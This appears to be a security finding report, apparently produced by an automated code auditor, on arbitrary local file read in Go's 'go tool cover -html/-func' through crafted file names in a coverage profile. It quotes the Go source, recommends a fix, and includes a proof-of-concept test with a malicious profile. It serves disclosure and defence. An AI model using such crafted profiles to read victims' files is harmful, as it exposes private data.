Found it: `findFile` in `src/cmd/cover/func.go` returns the raw `file` string unmodified whenever it is an absolute path or starts with `.`, and `htmlOutput`/`funcOutput` immediately pass that string to `os.ReadFile`/`parser.ParseFile` with no allowlist or containment check. [1](#0-0) [2](#0-1) 

### Title
`go tool cover -html`/`-func` arbitrary local file read via attacker-controlled `FileName` in an untrusted coverage profile - (File: src/cmd/cover/func.go, src/cmd/cover/html.go)

### Summary
`go tool cover -html=profile` and `go tool cover -func=profile` parse an arbitrary coverage-profile text file supplied by the user with `cover.ParseProfiles`, then treat each profile line's leading file-name token as a literal filesystem path via `findFile`. If that name is absolute (or starts with `.`), `findFile` returns it unchanged and `htmlOutput` calls `os.ReadFile(file)` on it directly, embedding the file's contents into the generated HTML report or emitting its error text. This mirrors the PostCSS `sourceMappingURL` bug class: an attacker-supplied "annotation" (here, the coverage profile's file-name field) is dereferenced against the local filesystem with no path validation, scheme check, or containment/allowlist, and the result is disclosed to whoever opens/generates the report.

### Finding Description
Entry point: a victim runs `go tool cover -html=<profile>` (or `-func=<profile>`) on a coverage profile they did not author themselves — e.g. a profile shared by a contributor, attached to a bug report, or downloaded as a CI artifact. `main` in `src/cmd/cover/cover.go` dispatches to `htmlOutput`/`funcOutput` [3](#0-2) , which call `cover.ParseProfiles(profile)` to parse the attacker-supplied text file into `Profile` structs containing an unsanitized `FileName` field taken straight from the profile text (analogous to `loadAnnotation` extracting the raw `sourceMappingURL` value in the PostCSS report).

For each profile entry, `fn := profile.FileName` is passed to `findFile(dirs, fn)`:
```go
func findFile(pkgs map[string]*Pkg, file string) (string, error) {
	if strings.HasPrefix(file, ".") || filepath.IsAbs(file) {
		// Relative or absolute path.
		return file, nil
	}
	...
}
``` [1](#0-0) 

There is no check that the resolved path stays within a project root, GOPATH, or GOROOT — an absolute path like `/etc/passwd` or a `.`-prefixed traversal like `./../../etc/passwd` is returned verbatim. The result is then handed to the sink in `htmlOutput`:
```go
file, err := findFile(dirs, fn)
...
src, err := os.ReadFile(file)
...
d.Files = append(d.Files, &templateFile{
    Name: fn,
    Body: template.HTML(buf.String()),
    ...
})
``` [4](#0-3) 

The file's bytes are HTML-escaped by `htmlGen` and embedded as `<pre>` content in the generated report, or, on read failure, the error `can't read %q: %v` (which can include partial path/content context) is surfaced to the user. `funcOutput` has the identical pattern [5](#0-4) .

### Impact Explanation
Running `go tool cover -html` or `-func` on an attacker-crafted coverage profile discloses the full contents of any file readable by the invoking user (not just the first ~10 bytes as in the PostCSS case, since the whole file is read and rendered/embedded) into the generated HTML report or command output. This is a genuine confidentiality violation for a normal developer workflow (reviewing/rendering a coverage profile received from someone else, e.g. in code review or CI artifact inspection) and would fall under Go's PUBLIC track as an information-disclosure bug in a `cmd/` tool, not a build-time "malicious source causes code execution" issue (`go build` is not involved).

### Likelihood Explanation
The victim workflow is ordinary: `go test -coverprofile=c.out` output is often shared/reviewed, and a user manually running `go tool cover -html=<received-file>` on someone else's profile is a normal, low-friction habit (the tool's own usage text encourages "given a coverage profile produced by 'go test'" without saying "never point it at a profile you didn't produce yourself"). No privileges, network access, or special setup are required by the attacker beyond convincing a user to run the tool against a profile they control — a realistic scenario for shared CI logs, bug-report attachments, or pair-review of coverage data.

### Recommendation
In `findFile` (`src/cmd/cover/func.go`), reject or specially confirm absolute paths and any resolved path that escapes the expected source tree/package directory before reading; require paths to resolve within `pkg.Dir` (or a `go list`-derived module root) rather than trusting the raw profile-supplied string when it is absolute or contains `..`. At minimum, warn/require an explicit flag before treating a coverage profile's file names as filesystem paths outside the current module, and avoid embedding arbitrary read file contents into generated HTML without confirming provenance.

### Proof of Concept
```go
// go_cover_arbitrary_read_test.go
package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// Simulates: go tool cover -html=evil.cov
// evil.cov's FileName field points at an absolute path outside any known package.
func TestCoverHTMLArbitraryFileRead(t *testing.T) {
	secret := filepath.Join(t.TempDir(), "secret.txt")
	if err := os.WriteFile(secret, []byte("TOP-SECRET-VALUE"), 0644); err != nil {
		t.Fatal(err)
	}

	profile := filepath.Join(t.TempDir(), "evil.cov")
	content := "mode: set\n" + secret + ":1.1,2.2 1 1\n"
	if err := os.WriteFile(profile, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	out := filepath.Join(t.TempDir(), "out.html")
	cmd := exec.Command("go", "tool", "cover", "-html="+profile, "-o", out)
	if err := cmd.Run(); err != nil {
		t.Fatalf("cover failed: %v", err)
	}

	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	// Expected: html.go's os.ReadFile(file) at the absolute path succeeds and the
	// secret bytes end up embedded in the generated HTML report.
	if !contains(got, []byte("TOP-SECRET-VALUE")) {
		t.Fatalf("expected leaked secret content in generated HTML, got:\n%s", got)
	}
}

func contains(haystack, needle []byte) bool {
	return len(haystack) >= len(needle) && string(haystack) != "" &&
		(len(needle) == 0 || bytesIndex(haystack, needle) >= 0)
}

func bytesIndex(h, n []byte) int {
	for i := 0; i+len(n) <= len(h); i++ {
		if string(h[i:i+len(n)]) == string(n) {
			return i
		}
	}
	return -1
}
```
Expected result: the test demonstrates that `go tool cover -html` reads and discloses the contents of an arbitrary absolute-path file named in an attacker-controlled coverage profile, confirming the file-read/disclosure primitive analogous to the PostCSS `sourceMappingURL` finding.

### Citations

**File:** src/cmd/cover/func.go (L70-79)
```go
	for _, profile := range profiles {
		fn := profile.FileName
		file, err := findFile(dirs, fn)
		if err != nil {
			return err
		}
		funcs, err := findFuncs(file)
		if err != nil {
			return err
		}
```

**File:** src/cmd/cover/func.go (L226-241)
```go
func findFile(pkgs map[string]*Pkg, file string) (string, error) {
	if strings.HasPrefix(file, ".") || filepath.IsAbs(file) {
		// Relative or absolute path.
		return file, nil
	}
	pkg := pkgs[path.Dir(file)]
	if pkg != nil {
		if pkg.Dir != "" {
			return filepath.Join(pkg.Dir, path.Base(file)), nil
		}
		if pkg.Error != nil {
			return "", errors.New(pkg.Error.Err)
		}
	}
	return "", fmt.Errorf("did not find package for %s in go list output", file)
}
```

**File:** src/cmd/cover/html.go (L37-59)
```go
	for _, profile := range profiles {
		fn := profile.FileName
		if profile.Mode == "set" {
			d.Set = true
		}
		file, err := findFile(dirs, fn)
		if err != nil {
			return err
		}
		src, err := os.ReadFile(file)
		if err != nil {
			return fmt.Errorf("can't read %q: %v", fn, err)
		}
		var buf strings.Builder
		err = htmlGen(&buf, src, profile.Boundaries(src))
		if err != nil {
			return err
		}
		d.Files = append(d.Files, &templateFile{
			Name:     fn,
			Body:     template.HTML(buf.String()),
			Coverage: percentCovered(profile),
		})
```

**File:** src/cmd/cover/cover.go (L118-123)
```go
	// Output HTML or function coverage information.
	if *htmlOut != "" {
		err = htmlOutput(profile, *output)
	} else {
		err = funcOutput(profile, *output)
	}
```
